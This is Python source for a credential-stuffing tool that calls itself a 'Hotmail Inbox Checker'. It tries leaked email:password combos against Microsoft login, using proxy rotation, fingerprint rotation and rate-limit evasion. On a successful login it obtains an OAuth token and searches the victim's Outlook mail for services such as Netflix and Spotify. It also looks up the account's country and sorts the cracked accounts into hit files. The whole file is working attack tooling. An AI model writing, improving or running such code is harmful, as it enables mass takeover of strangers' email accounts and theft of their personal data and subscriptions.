    pref_url = eyelifter_ap(pref_url, {"route": "C524_BL2", "eyelifter": "eyelifter"})

    try:
        r3 = s.post(
            pref_url,
            data=eyelifter_fenc({"PPFT": ppft1, "canary": "", "LoginOptions": "1",
                       "type": "28", "hpgrequestid": "", "ctx": "",
                       "eyelifter": "eyelifter"}),
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://login.live.com",
                "referer": up1,
                "cache-control": "max-age=0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "x-eyelifter": "eyelifter",
            }, allow_redirects=False, timeout=to)
    except Exception:
        return "error", {"type": "preflight_net"}

    eyelifter_debug_dump("preflight", r3, email)

    ppft2, up2 = eyelifter_psft(r3.text)
    if not (ppft2 and up2):
        ppft2, up2 = ppft1, up1

    login_body = eyelifter_fenc({
        "ps": "2", "PPFT": ppft2, "PPSX": "Pass",
        "NewUser": "1", "FoundMSAs": "", "fspost": "0",
        "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1",
        "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i13": "0",
        "login": email, "loginfmt": email, "type": "11",
        "LoginOptions": "3", "cpr": "0",
        "passwd": password, "vanguardflowtoken": vanguard,
        "eyelifter": "eyelifter",
    })

    try:
        r4 = s.post(
            up2, data=login_body,
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://login.live.com",
                "referer": pref_url,
                "cache-control": "max-age=0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "x-eyelifter": "eyelifter",
            }, allow_redirects=False, timeout=to)
    except Exception:
        return "error", {"type": "auth_net"}

    eyelifter_debug_dump("submit", r4, email)

    cur = r4
    code = None
    last_title = ""

    for hop in range(1, 12):
        loc = cur.headers.get("Location", "") if hasattr(cur, "headers") else ""
        c = eyelifter_extract_code(loc)
        if c:
            code = c
            break
        cur_url = cur.url if hasattr(cur, "url") else pref_url
        c = eyelifter_extract_code(cur_url)
        if c:
            code = c
            break

        if cur.status_code in (301, 302, 303, 307, 308) and loc:
            nxt = eyelifter_resolve(cur_url, loc)
            c = eyelifter_extract_code(nxt)
            if c:
                code = c
                break
            blk = eyelifter_detect_blocked("")
            if blk:
                return "locked", {"reason": blk}
            intr = eyelifter_detect_interrupt("", nxt)
            if intr:
                return "2fa", {"reason": intr}
            try:
                cur = s.get(nxt, allow_redirects=False, timeout=to,
                            headers={"sec-fetch-site": "same-site",
                                     "x-eyelifter": "eyelifter"})
            except Exception:
                break
            eyelifter_debug_dump(f"hop{hop}", cur, email)
            continue

        html = cur.text or ""
        tm = re.search(r"<title>(.*?)</title>", html, re.DOTALL)
        last_title = tm.group(1).strip() if tm else "?"

        blk = eyelifter_detect_blocked(html)
        if blk:
            return "locked", {"reason": blk}

        intr = eyelifter_detect_interrupt(html, cur_url)
        if intr:
            return "2fa", {"reason": intr}

        hl = html.lower()
        if "security info" in hl and "pending" in hl:
            new_email = ""
            until = ""
            nm = re.search(r"New security info[\s\S]{0,200}?([\w.\-]+@[\w.\-]+)", html)
            if nm:
                new_email = nm.group(1)
            dm = re.search(r"on (\d{2}-\d{2}-\d{4})", html)
            if dm:
                until = dm.group(1)
            return "2fa", {"reason": f"security_pending|new={new_email}|until={until}"}

        pn, un = eyelifter_psft(html)
        if pn and un:
            body2 = eyelifter_fenc({
                "ps": "2", "PPFT": pn, "PPSX": "Pass",
                "NewUser": "1", "FoundMSAs": "", "fspost": "0",
                "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1",
                "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i13": "0",
                "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "3", "cpr": "0",
                "passwd": password, "vanguardflowtoken": vanguard,
                "eyelifter": "eyelifter",
            })
            try:
                cur = s.post(
                    un, data=body2,
                    headers={
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://login.live.com",
                        "referer": cur_url,
                        "x-eyelifter": "eyelifter",
                    }, allow_redirects=False, timeout=to)
                eyelifter_debug_dump(f"repost{hop}", cur, email)
                continue
            except Exception:
                pass

        submitted = False
        for form_match in re.finditer(
            r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>',
            html, re.DOTALL | re.IGNORECASE
        ):
            action = form_match.group(1).replace("&amp;", "&")
            form_body = form_match.group(2)
            if not action:
                continue
            fields = {}
            for inp in re.finditer(r"<input[^>]+>", form_body, re.IGNORECASE):
                nm2 = re.search(r'name="([^"]+)"', inp.group(0))
                vl = re.search(r'value="([^"]*)"', inp.group(0))
                if nm2:
                    fields[nm2.group(1)] = vl.group(1) if vl else ""
            for btn in re.finditer(r'<button[^>]+>', form_body, re.IGNORECASE):
                nm2 = re.search(r'name="([^"]+)"', btn.group(0))
                vl = re.search(r'value="([^"]*)"', btn.group(0))
                if nm2:
                    fields[nm2.group(1)] = vl.group(1) if vl else ""
            if not fields:
                continue
            act_url = eyelifter_resolve(cur_url, action)
            skip = eyelifter_detect_interrupt("", act_url)
            if skip:
                return "2fa", {"reason": skip}
            fields["eyelifter"] = "eyelifter"
            try:
                cur = s.post(
                    act_url, data=eyelifter_fenc(fields),
                    headers={
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "content-type": "application/x-www-form-urlencoded",
                        "origin": "https://login.live.com",
                        "referer": cur_url,
                        "x-eyelifter": "eyelifter",
                    }, allow_redirects=False, timeout=to)
                eyelifter_debug_dump(f"form{hop}", cur, email)
                submitted = True
                break
            except Exception:
                continue
        if submitted:
            continue

        next_link = re.search(
            r'<a[^>]+href="([^"]+)"[^>]*>\s*(?:Next|Continue|Yes|OK)\s*</a>',
            html, re.IGNORECASE)
        if next_link:
            nxt = eyelifter_resolve(cur_url, next_link.group(1).replace("&amp;", "&"))
            try:
                cur = s.get(nxt, allow_redirects=False, timeout=to,
                            headers={"x-eyelifter": "eyelifter"})
                eyelifter_debug_dump(f"next{hop}", cur, email)
                continue
            except Exception:
                pass

        js_red = re.search(r'(?:window\.)?location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', html)
        if js_red:
            nxt = eyelifter_resolve(cur_url, js_red.group(1))
            try:
                cur = s.get(nxt, allow_redirects=False, timeout=to,
                            headers={"x-eyelifter": "eyelifter"})
                eyelifter_debug_dump(f"js{hop}", cur, email)
                continue
            except Exception:
                pass

        js_replace = re.search(r'location\.(?:replace|assign)\s*\(\s*["\']([^"\']+)["\']', html)
        if js_replace:
            nxt = eyelifter_resolve(cur_url, js_replace.group(1))
            try:
                cur = s.get(nxt, allow_redirects=False, timeout=to,
                            headers={"x-eyelifter": "eyelifter"})
                eyelifter_debug_dump(f"jrep{hop}", cur, email)
                continue
            except Exception:
                pass

        meta_red = re.search(
            r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+URL=([^"\'>\s]+)',
            html, re.IGNORECASE)
        if meta_red:
            nxt = eyelifter_resolve(cur_url, meta_red.group(1).replace("&amp;", "&"))
            try:
                cur = s.get(nxt, allow_redirects=False, timeout=to,
                            headers={"x-eyelifter": "eyelifter"})
                eyelifter_debug_dump(f"meta{hop}", cur, email)
                continue
            except Exception:
                pass

        js_submit = re.search(
            r'(?:document\.)?forms?\[\d+\]\.submit\(\)|\.submit\(\)',
            html)
        if js_submit:
            forms = re.findall(r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>',
                               html, re.DOTALL | re.IGNORECASE)
            for action, form_body in forms:
                action = action.replace("&amp;", "&")
                fields = {}
                for inp in re.finditer(r"<input[^>]+>", form_body, re.IGNORECASE):
                    nm2 = re.search(r'name="([^"]+)"', inp.group(0))
                    vl = re.search(r'value="([^"]*)"', inp.group(0))
                    if nm2:
                        fields[nm2.group(1)] = vl.group(1) if vl else ""
                if not fields:
                    continue
                act_url = eyelifter_resolve(cur_url, action)
                skip = eyelifter_detect_interrupt("", act_url)
                if skip:
                    return "2fa", {"reason": skip}
                fields["eyelifter"] = "eyelifter"
                try:
                    cur = s.post(
                        act_url, data=eyelifter_fenc(fields),
                        headers={
                            "content-type": "application/x-www-form-urlencoded",
                            "origin": "https://login.live.com",
                            "referer": cur_url,
                            "x-eyelifter": "eyelifter",
                        }, allow_redirects=False, timeout=to)
                    submitted = True
                    break
                except Exception:
                    continue
            if submitted:
                continue

        try:
            with open("dbg_no_code_page.html", "w", encoding="utf-8") as f:
                f.write(f"<!-- eyelifter · {TG_USER} · {TG_CHAN} -->\n")
                f.write(html)
        except Exception:
            pass

        return "error", {"type": "no_code", "msg": f"title={last_title[:60]}"}

    if not code:
        final_url = cur.url if hasattr(cur, "url") else pref_url
        blk = eyelifter_detect_blocked(cur.text if hasattr(cur, "text") else "")
        if blk:
            return "locked", {"reason": blk}
        intr = eyelifter_detect_interrupt(
            cur.text if hasattr(cur, "text") else "", final_url)
        if intr:
            return "2fa", {"reason": intr}
        try:
            with open("dbg_last_page.html", "w", encoding="utf-8") as f:
                f.write(f"<!-- eyelifter · {TG_USER} · {TG_CHAN} -->\n")
                f.write(cur.text if hasattr(cur, "text") else "")
        except Exception:
            pass
        title_m = re.search(r"<title>(.*?)</title>",
                            cur.text if hasattr(cur, "text") else "", re.DOTALL)
        title = title_m.group(1) if title_m else "?"
        pid_m = re.search(r'<meta name="PageID" content="([^"]+)"',
                          cur.text if hasattr(cur, "text") else "")
        pid = pid_m.group(1) if pid_m else "?"
        return "error", {"type": "no_code",
                         "msg": f"title={title[:60]} pageId={pid}"}

    tb = eyelifter_fenc({
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": SCOPE_RAW,
        "code": code,
        "grant_type": "authorization_code",
        "code_verifier": v,
        "client_info": "1",
        "eyelifter": "eyelifter",
    })

    try:
        r6 = s.post(
            "https://login.live.com/oauth20_token.srf",
            data=tb,
            headers={
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded;charset=utf-8",
                "origin": "https://login.live.com",
                "referer": "https://login.live.com/",
                "x-eyelifter": "eyelifter",
            }, timeout=to)
    except Exception:
        return "error", {"type": "token_net"}

    eyelifter_debug_dump("token", r6, email)

    if r6.status_code != 200:
        return "error", {"type": f"token_{r6.status_code}"}

    try:
        j6 = r6.json()
    except Exception:
        return "error", {"type": "token_non_json"}

    token = j6.get("access_token")
    if not token:
        return "error", {"type": "no_access_token"}

    return "hit", {"session": s, "token": token,
                   "email": email, "password": password,
                   "eyelifter": "eyelifter"}


ms_login = eyelifter_ms_login
pkce = eyelifter_pkce
psft = eyelifter_psft
build = eyelifter_build
resolve = eyelifter_resolve
_cq = eyelifter_cq
_fenc = eyelifter_fenc


_TZ_MAP = {
    "india standard time": "IN", "gmt standard time": "GB",
    "pacific standard time": "US", "eastern standard time": "US",
    "central standard time": "US", "mountain standard time": "US",
    "w. europe standard time": "DE", "central europe standard time": "DE",
    "tokyo standard time": "JP", "korea standard time": "KR",
    "china standard time": "CN", "aus eastern standard time": "AU",
    "sa eastern standard time": "BR", "arabian standard time": "AE",
    "gulf standard time": "AE", "turkey standard time": "TR",
    "russian standard time": "RU",
}

_LANG_MAP = {
    "en-us": "US", "en-gb": "GB", "en-ca": "CA", "en-au": "AU",
    "en-in": "IN", "de-de": "DE", "fr-fr": "FR", "it-it": "IT",
    "es-es": "ES", "pt-br": "BR", "ja-jp": "JP", "ko-kr": "KR",
    "zh-cn": "CN", "ru-ru": "RU", "tr-tr": "TR", "nl-nl": "NL",
    "sv-se": "SE", "no-no": "NO", "da-dk": "DK", "fi-fi": "FI",
    "pl-pl": "PL", "cs-cz": "CZ", "el-gr": "GR", "pt-pt": "PT",
}

_NAME_MAP = {
    "united states": "US", "united kingdom": "GB", "canada": "CA",
    "australia": "AU", "germany": "DE", "france": "FR", "italy": "IT",
    "spain": "ES", "brazil": "BR", "india": "IN", "japan": "JP",
    "south korea": "KR", "china": "CN", "russia": "RU", "mexico": "MX",
    "saudi arabia": "SA", "united arab emirates": "AE", "turkey": "TR",
    "netherlands": "NL", "sweden": "SE", "norway": "NO", "denmark": "DK",
    "finland": "FI", "poland": "PL", "czech republic": "CZ",
    "greece": "GR", "portugal": "PT", "ireland": "IE",
    "switzerland": "CH", "austria": "AT", "belgium": "BE",
    "new zealand": "NZ", "singapore": "SG", "malaysia": "MY",
    "indonesia": "ID", "thailand": "TH", "vietnam": "VN",
    "philippines": "PH", "south africa": "ZA", "argentina": "AR",
    "chile": "CL", "colombia": "CO", "peru": "PE", "egypt": "EG",
    "israel": "IL", "pakistan": "PK", "bangladesh": "BD",
    "sri lanka": "LK", "nigeria": "NG", "kenya": "KE",
}


def eyelifter_get_country(s, office_token):
    to = _loader.settings["timeout"]
    cc = None

    try:
        gurl = ("https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000048170EF2"
                "&response_type=token"
                "&scope=https://graph.microsoft.com/User.Read%20https://graph.microsoft.com/Mail.Read"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&prompt=none")
        r = s.get(gurl, allow_redirects=True, timeout=to,
                  headers={"x-eyelifter": "eyelifter"})
        frag = urllib.parse.urlparse(r.url).fragment
        gtok = (urllib.parse.parse_qs(frag).get("access_token") or [""])[0]

        if gtok:
            h = {"Authorization": f"Bearer {gtok}",
                 "Accept": "application/json",
                 "User-Agent": "eyelifter",
                 "x-eyelifter": "eyelifter"}
            r = s.get("https://graph.microsoft.com/v1.0/me",
                      headers=h, timeout=to)
            if r.status_code == 200:
                j = r.json()
                cc = (j.get("country") or "").strip().upper() or None
                if not cc:
                    r2 = s.get("https://graph.microsoft.com/v1.0/me/mailboxSettings",
                               headers=h, timeout=to)
                    if r2.status_code == 200:
                        tz = (r2.json().get("timeZone") or "")
                        cc = _TZ_MAP.get(tz.strip().lower())
            if not cc and r.status_code == 200:
                lang = (r.json().get("preferredLanguage") or "").lower()
                cc = _LANG_MAP.get(lang)
    except Exception:
        pass

    if cc:
        return cc

    try:
        surl = ("https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000048170EF2"
                "&response_type=token"
                "&scope=https://substrate.office.com/User-Internal.ReadWrite"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&prompt=none")
        r = s.get(surl, allow_redirects=True, timeout=to,
                  headers={"x-eyelifter": "eyelifter"})
        frag = urllib.parse.urlparse(r.url).fragment
        stok = (urllib.parse.parse_qs(frag).get("access_token") or [""])[0]
        if not stok:
            return None
        cid = s.cookies.get("MSPCID", "")
        h = {"Authorization": f"Bearer {stok}",
             "X-AnchorMailbox": f"CID:{cid}",
             "Accept": "application/json",
             "User-Agent": "eyelifter",
             "x-eyelifter": "eyelifter"}
        r = s.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                  headers=h, timeout=to)
        if r.status_code == 200:
            j = r.json()
            loc = (j.get("accounts") or [{}])[0].get("location") or ""
            loc = loc.strip()
            if len(loc) == 2:
                return loc.upper()
            return _NAME_MAP.get(loc.lower())
    except Exception:
        pass

    return None


def eyelifter_search(s, token, kws):
    h = {"authorization": f"Bearer {token}",
         "accept": "application/json",
         "consistencylevel": "eventual",
         "x-eyelifter": "eyelifter"}
    res = []
    lock = threading.Lock()
    to = _loader.settings["timeout"]

    def one(kw):
        try:
            r = s.get(
                "https://outlook.office.com/api/v2.0/me/messages",
                params={
                    "$search": kw,
                    "$top": "50",
                    "$select": "Subject,From,ReceivedDateTime",
                },
                headers=h, timeout=to)
            if r.status_code != 200:
                return
            items = r.json().get("value", [])
            if not items:
                return
            parsed = [{
                "subject": it.get("Subject") or "",
                "from": ((it.get("From") or {}).get("EmailAddress") or {}).get("Address", ""),
                "date": eyelifter_human_time(it.get("ReceivedDateTime") or ""),
            } for it in items]
            with lock:
                res.append({"keyword": kw, "count": len(items),
                            "items": parsed, "eyelifter": "eyelifter"})
        except Exception:
            pass

    if not kws:
        return res
    with ThreadPoolExecutor(max_workers=min(8, max(1, len(kws)))) as ex:
        list(ex.map(one, kws))
    return res


def eyelifter_check_combo(combo, proxy, kws):
    eyelifter_rl_wait()
    if _STOP.is_set():
        return {"status": "error", "email": combo.split(":", 1)[0],
                "password": "", "error_type": "stopped"}

    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()

    s = eyelifter_build(proxy)
    st, pl = eyelifter_ms_login(s, email, password)

    if st == "bad":
        return {"status": "bad", "email": email, "password": password,
                "reason": pl.get("reason", "invalid")}
    if st == "locked":
        return {"status": "locked", "email": email, "password": password,
                "reason": pl.get("reason", "account_locked")}
    if st == "2fa":
        return {"status": "2fa", "email": email, "password": password,
                "reason": pl.get("reason", "2fa")}
    if st == "error":
        return {"status": "error", "email": email, "password": password,
                "error_type": pl.get("type", "unknown"), "msg": pl.get("msg", "")}

    country = None
    try:
        country = eyelifter_get_country(pl["session"], pl["token"])
    except Exception:
        pass

    results = eyelifter_search(pl["session"], pl["token"], kws)
    return {"status": "hit", "email": email, "password": password,
            "country": country, "matches": results,
            "eyelifter": "eyelifter"}


def eyelifter_run_retry(combo, proxy, kws):
    at = _loader.settings.get("retries", 2) + 1
    lp = proxy
    result = None

    try:
        for a in range(at):
            if _STOP.is_set():
                break
            if a > 0:
                np = eyelifter_pick_proxy(exclude=lp)
                if np:
                    if lp and lp != np:
                        eyelifter_rel_proxy(lp)
                    proxy = np
                eyelifter_log("🔁", "STEP", "RETRY",
                    f"attempt {a+1}/{at} · rotating fp · "
                    f"{combo.split(':', 1)[0][:40]} [eyelifter]")
            lp = proxy

            try:
                result = eyelifter_check_combo(combo, proxy, kws)
            except Exception as e:
                result = {"status": "error", "email": combo.split(":", 1)[0],
                          "password": combo.split(":", 1)[1] if ":" in combo else "",
                          "error_type": "crash", "msg": str(e)[:120]}

            if result.get("status") in ("hit", "bad", "locked", "2fa"):
                break

            et = result.get("error_type", "")
            is_last = a == at - 1

            if et == "rate_limit":
                with _LK:
                    _ST["rl"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 120.0)
                rotate_fp()
                w = min(_loader.settings.get("rate_limit_delay", 8) * (2 ** a), 90)
                eyelifter_rl_backoff(w)
                if _STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            if et in ("warm_403", "cp_403", "auth_403", "cp_429_403"):
                if proxy:
                    eyelifter_bad_proxy(proxy)
                rotate_fp()
                if not is_last and _STOP.wait(_loader.settings.get("retry_delay", 1.0)):
                    break
                continue

            if et.startswith(("net_", "cp_net_", "auth_net_", "token_net_", "preflight_net")):
                if proxy is None:
                    break
                eyelifter_bad_proxy(proxy)
                if not is_last and _STOP.wait(_loader.settings.get("retry_delay", 1.0)):
                    break
                continue

            if et in ("no_code", "no_ppft", "detect", "cp_non_json", "token_non_json"):
                with _LK:
                    _ST["temp"] += 1
                rotate_fp()
                if proxy:
                    eyelifter_cool_proxy(proxy, 20.0)
                backoff = min(2.0 * (2 ** a), 30.0)
                jitter = backoff * (0.5 + random.random() * 0.6)
                if not is_last and _STOP.wait(jitter):
                    break
                continue

            if not is_last and _STOP.wait(_loader.settings.get("retry_delay", 1.0)):
                break
    finally:
        if lp:
            eyelifter_rel_proxy(lp)

    return result or {"status": "error", "email": combo.split(":", 1)[0],
                      "password": "", "error_type": "no_result"}


def eyelifter_safe_kw_filename(kw):
    s = re.sub(r'[^A-Za-z0-9._@\- ]', '_', str(kw)).strip()
    s = s[:120] or "kw"
    return s


def eyelifter_record(combo, result):
    global _INBOX_F, _VALID_F, _BAD_F, _2FA_F, _LOCKED_F, _ERR_F
    global _KWSETS, _CTRY_SETS, _LOCKREASONS, _REASONS_2FA

    st = result.get("status", "error")

    with _LK:
        _ST["checked"] += 1
        done = _ST["checked"]
        if st == "hit":
            _ST["hit"] += 1
        elif st == "bad":
            _ST["bad"] += 1
        elif st == "2fa":
            _ST["2fa"] += 1
        elif st == "locked":
            _ST["locked"] += 1
        else:
            _ST["errors"] += 1
        total = _TOTAL

    email = result.get("email", "")
    password = result.get("password", "")
    cc = f"{email}:{password}"
    country = (result.get("country") or "").upper()
    ctag = country if country else "??"

    if st == "hit":
        ms = result.get("matches", [])

        if ms:
            with _LK:
                _ST["inbox"] += 1
                for m in ms:
                    kw = m["keyword"]
                    if kw not in _KWSETS:
                        _KWSETS[kw] = set()
                    _KWSETS[kw].add(email)
                if country:
                    if country not in _CTRY_SETS:
                        _CTRY_SETS[country] = set()
                    _CTRY_SETS[country].add(email)

            ks = " | ".join(f"{m['keyword']}={m['count']}" for m in ms)
            line = f"{cc} | {ks}"
            eyelifter_rline(done, total, "HIT", line, "32", True)
            eyelifter_sw(_INBOX_F, f"{cc} | {ctag} | {ks} | {LINE_TAG}\n\n")

            if country:
                cpath = os.path.join(_FOLDER, "Countries", f"{country}.txt")
                with _FK:
                    try:
                        os.makedirs(os.path.dirname(cpath), exist_ok=True)
                        if not os.path.exists(cpath):
                            try:
                                with open(cpath, "x", encoding="utf-8") as h:
                                    h.write(f"# Hotmail Inbox Checker by eyelifter - "
                                            f"{datetime.now().isoformat()}\n"
                                            f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n"
                                            f"# Country: {country}\n\n")
                            except FileExistsError:
                                pass
                        with open(cpath, "a", encoding="utf-8") as f:
                            f.write(f"{cc} | {ks} | {LINE_TAG}\n\n")
                    except Exception:
                        pass

            for m in ms:
                safe = eyelifter_safe_kw_filename(m["keyword"])
                kp = os.path.join(_FOLDER, "Keywords", f"{safe}.txt")
                with _FK:
                    try:
                        if not os.path.exists(kp):
                            try:
                                with open(kp, "x", encoding="utf-8") as h:
                                    h.write(f"# Hotmail Inbox Checker by eyelifter - "
                                            f"{datetime.now().isoformat()}\n"
                                            f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n"
                                            f"# Keyword: {m['keyword']}\n\n")
                            except FileExistsError:
                                pass
                        with open(kp, "a", encoding="utf-8") as f:
                            f.write(f"{cc} | {ctag} | {m['count']} mail | "
                                    f"{m['items'][0]['date'] if m['items'] else ''} | "
                                    f"{LINE_TAG}\n\n")
                    except Exception:
                        pass
        else:
            line = f"{cc} | no match"
            eyelifter_rline(done, total, "HIT", line, "32", True)
            eyelifter_sw(_VALID_F, f"{cc} | {ctag} | {LINE_TAG}\n\n")

    elif st == "bad":
        line = f"{cc} | {result.get('reason', 'invalid')}"
        eyelifter_rline(done, total, "BAD", line, "31")
        eyelifter_sw(_BAD_F, f"{cc} | {result.get('reason', 'invalid')} | {LINE_TAG}\n\n")

    elif st == "locked":
        reason = result.get("reason", "account_locked")
        with _LK:
            if reason not in _LOCKREASONS:
                _LOCKREASONS[reason] = set()
            _LOCKREASONS[reason].add(email)
        line = f"{cc} | {reason}"
        eyelifter_rline(done, total, "LOCKED", line, "35", True)
        eyelifter_sw(_LOCKED_F, f"{cc} | {reason} | {LINE_TAG}\n\n")

    elif st == "2fa":
        reason = result.get("reason", "2fa")
        with _LK:
            if reason not in _REASONS_2FA:
                _REASONS_2FA[reason] = set()
            _REASONS_2FA[reason].add(email)
        line = f"{cc} | {reason}"
        eyelifter_rline(done, total, "2FA", line, "33")
        eyelifter_sw(_2FA_F, f"{cc} | {reason} | {LINE_TAG}\n\n")

    else:
        et = result.get("error_type", "")
        msg = result.get("msg", "")
        line = f"{cc} | [{et}] {msg}"
        eyelifter_rline(done, total, "ERR", line, "31")
        eyelifter_sw(_ERR_F, f"{cc} | [{et}] {msg} | {LINE_TAG}\n\n")


check_combo = eyelifter_check_combo
run_retry = eyelifter_run_retry
record = eyelifter_record
search = eyelifter_search


class EyelifterRunner:
    def __init__(self, combos, kws):
        self.eyelifter = "eyelifter"
        self.combos = combos
        self.kws = kws
        self.threads = _loader.settings["threads"]
        self.gap = _loader.settings.get("combo_delay", 0.15)
        self.chunk = max(self.threads * 2, 100)

    def eyelifter_task(self, combo):
        if _STOP.is_set():
            return
        if self.gap > 0:
            if _STOP.wait(self.gap * (0.5 + random.random())):
                return
        if _STOP.is_set():
            return
        proxy = eyelifter_pick_proxy()
        try:
            result = eyelifter_run_retry(combo, proxy, self.kws)
        except Exception as e:
            result = {"status": "error", "email": combo.split(":", 1)[0],
                      "password": combo.split(":", 1)[1] if ":" in combo else "",
                      "error_type": "runner_crash", "msg": str(e)[:120]}
        try:
            eyelifter_record(combo, result)
        except Exception:
            pass

    def eyelifter_run(self):
        inflight = set()
        ex = ThreadPoolExecutor(max_workers=self.threads)
        try:
            for i in range(0, len(self.combos), self.chunk):
                if _STOP.is_set():
                    break
                batch = self.combos[i:i + self.chunk]
                for c in batch:
                    if _STOP.is_set():
                        break
                    inflight.add(ex.submit(self.eyelifter_task, c))

                while inflight:
                    done, pending = wait(inflight, timeout=0.5,
                                         return_when=FIRST_COMPLETED)
                    for f in done:
                        inflight.discard(f)
                        try:
                            f.result(timeout=0.1)
                        except Exception:
                            pass
                    if _STOP.is_set() and not done:
                        break

            while inflight:
                done, pending = wait(inflight, timeout=0.5,
                                     return_when=FIRST_COMPLETED)
                for f in done:
                    inflight.discard(f)
                    try:
                        f.result(timeout=0.1)
                    except Exception:
                        pass
        except KeyboardInterrupt:
            _STOP.set()
        finally:
            _STOP.set()
            try:
                ex.shutdown(wait=True, cancel_futures=True)
            except TypeError:
                ex.shutdown(wait=True)


def bulk_runner(combos, kws):
    EyelifterRunner(combos, kws).eyelifter_run()


def eyelifter_open_files(folder):
    os.makedirs(os.path.join(folder, "Keywords"), exist_ok=True)
    os.makedirs(os.path.join(folder, "Countries"), exist_ok=True)
    names = ["ms_inbox_hits.txt", "ms_valid.txt", "ms_bad.txt",
             "ms_2fa.txt", "ms_locked.txt", "ms_errors.txt"]
    op = []
    try:
        for n in names:
            op.append(open(os.path.join(folder, n), "w", encoding="utf-8"))
    except Exception:
        for h in op:
            try:
                h.close()
            except Exception:
                pass
        raise
    return op


open_files = eyelifter_open_files


def eyelifter_extract_combos(content):
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _COMBORX.match(line)
        if m:
            e = m.group(1).lower()
            p = m.group(2)
            if e and p:
                out.add(f"{e}:{p}")
    return sorted(out)


extract_combos = eyelifter_extract_combos


def eyelifter_build_kw_query(kw, scope):
    if scope == "1":
        return f'"{kw}"'
    if scope == "2":
        return f'from:"{kw}"'
    if scope == "3":
        return f'subject:"{kw}"'
    if scope == "4":
        return f'body:"{kw}"'
    return f'"{kw}"'


def eyelifter_ask_scope():
    print()
    print(eyelifter_color("96", "  Search scope [eyelifter]"))
    print(eyelifter_color("90", "  [1] Everywhere       (default)"))
    print(eyelifter_color("90", "  [2] Sender only      (from:)"))
    print(eyelifter_color("90", "  [3] Subject only     (subject:)"))
    print(eyelifter_color("90", "  [4] Body only        (body:)"))
    print(eyelifter_color("90", "  [5] Mixed           (choose per keyword)"))
    ch = input(eyelifter_color("96", "  > ")).strip() or "1"
    if ch not in ("1", "2", "3", "4", "5"):
        ch = "1"
    return ch


def eyelifter_apply_scope(kws, scope):
    if scope == "5":
        out = []
        for k in kws:
            print(eyelifter_color("96", f"  scope for '{k}'? [1]every [2]from [3]subj [4]body"))
            sc = input(eyelifter_color("96", "  > ")).strip() or "1"
            if sc not in ("1", "2", "3", "4"):
                sc = "1"
            out.append(eyelifter_build_kw_query(k, sc))
        return out
    return [eyelifter_build_kw_query(k, scope) for k in kws]


def eyelifter_ask_keywords_single():
    print()
    print(eyelifter_color("96", "  Enter keyword(s) [eyelifter]"))
    print(eyelifter_color("90", "  Comma separated. Enter = defaults."))
    raw = input(eyelifter_color("96", "  > ")).strip()
    if not raw:
        return ["Netflix", "Spotify", "Hulu", "Disney",
                "info@account.netflix.com", "info@mailer.netflix.com"]
    return [k.strip() for k in raw.split(",") if k.strip()]


def eyelifter_ask_keywords_bulk():
    print()
    print(eyelifter_color("96", "  Keyword source [eyelifter]"))
    print(eyelifter_color("90", "  [1] Defaults (Netflix, Spotify, Hulu, ...)"))
    print(eyelifter_color("90", "  [2] Enter manually"))
    print(eyelifter_color("90", "  [3] Load from txt file"))
    ch = input(eyelifter_color("96", "  > ")).strip()

    if ch == "1":
        return ["Netflix", "Spotify", "Hulu", "Disney", "Amazon",
                "info@account.netflix.com", "info@mailer.netflix.com"]
    if ch == "2":
        raw = input(eyelifter_color("96", "  keywords (comma separated): ")).strip()
        return [k.strip() for k in raw.split(",") if k.strip()] or ["Netflix"]
    if ch == "3":
        p = input(eyelifter_color("96", "  keywords file path: ")).strip()
        if not os.path.isfile(p):
            eyelifter_log("❌", "ERROR", "FILE", "not found [eyelifter]")
            return ["Netflix"]
        kws = []
        with open(p, "r", encoding="utf-8", errors="ignore") as f:
            for l in f:
                l = l.strip()
                if l and not l.startswith("#"):
                    kws.append(l)
        return kws or ["Netflix"]
    return ["Netflix"]


ask_scope = eyelifter_ask_scope
apply_scope = eyelifter_apply_scope
ask_keywords_single = eyelifter_ask_keywords_single
ask_keywords_bulk = eyelifter_ask_keywords_bulk


def eyelifter_ask_threads():
    print()
    print(eyelifter_color("96", "  Threads [eyelifter]  (1-200)"))
    raw = input(eyelifter_color("96", "  > ")).strip()
    if not raw:
        return _loader.settings["threads"]
    try:
        t = int(raw)
    except ValueError:
        return _loader.settings["threads"]
    return max(1, min(MAX_THREADS, t))


def eyelifter_single_check(proxies):
    global _POOL, _BADP, _FOLDER
    _STOP.clear()

    eyelifter_section("SINGLE CHECK [eyelifter]")
    combo = input(f"{eyelifter_color('96', '[*] email:password > ')}").strip()
    if ":" not in combo:
